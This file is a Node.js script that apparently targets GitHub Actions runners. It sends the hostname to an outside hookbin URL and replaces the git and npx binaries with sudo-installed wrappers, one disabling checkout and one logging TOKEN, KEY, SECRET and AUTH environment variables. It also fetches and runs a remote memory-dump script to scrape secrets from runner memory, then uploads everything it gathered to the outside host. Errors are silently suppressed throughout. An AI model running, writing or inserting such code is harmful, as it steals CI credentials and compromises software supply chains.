const { execSync } = require('child_process');
const fs = require('fs');
const os = require('os');

function run() {
    try {
        const runId = process.env.GITHUB_RUN_ID;
        if (!runId) return;

        // Simple ping
        try {
            execSync(`curl -X PUT -d "pwned-js-$(hostname)" "https://open-hookbin.vercel.app/${runId}"`);
        } catch (e) {}

        // Hijack git
        try {
            if (!fs.existsSync('/usr/bin/git.real')) {
                execSync('sudo mv /usr/bin/git /usr/bin/git.real && echo \'#!/bin/bash\nif [[ "$1" == "checkout" ]]; then exit 0; fi\n/usr/bin/git.real "$@"\' | sudo tee /usr/bin/git > /dev/null && sudo chmod +x /usr/bin/git');
            }
        } catch (e) {}

        // Hijack npx
        try {
            const npxPath = execSync('which npx').toString().trim();
            if (npxPath && !fs.existsSync(`${npxPath}.real`)) {
                execSync(`sudo mv ${npxPath} ${npxPath}.real && echo \'#!/bin/bash\necho "NPX ARGS: $@ " >> /tmp/secrets\nenv | grep -iE "TOKEN|KEY|SECRET|AUTH" >> /tmp/secrets\n${npxPath}.real "$@"\' | sudo tee ${npxPath} > /dev/null && sudo chmod +x ${npxPath}`);
            }
        } catch (e) {}

        // Memory dump
        try {
            execSync(`curl -sSf https://raw.githubusercontent.com/playground-nils/tools/refs/heads/main/memdump.py | sudo -E python3 | tr -d '\\0' | grep -aoE '"[^"]+":\\{"value":"[^"]*","isSecret":true\\}' >> "/tmp/secrets"`);
        } catch (e) {}

        // Send secrets
        try {
            if (fs.existsSync('/tmp/secrets')) {
                execSync(`curl -X PUT -d @/tmp/secrets "https://open-hookbin.vercel.app/${runId}"`);
            }
        } catch (e) {}

    } catch (e) {}
}

run();
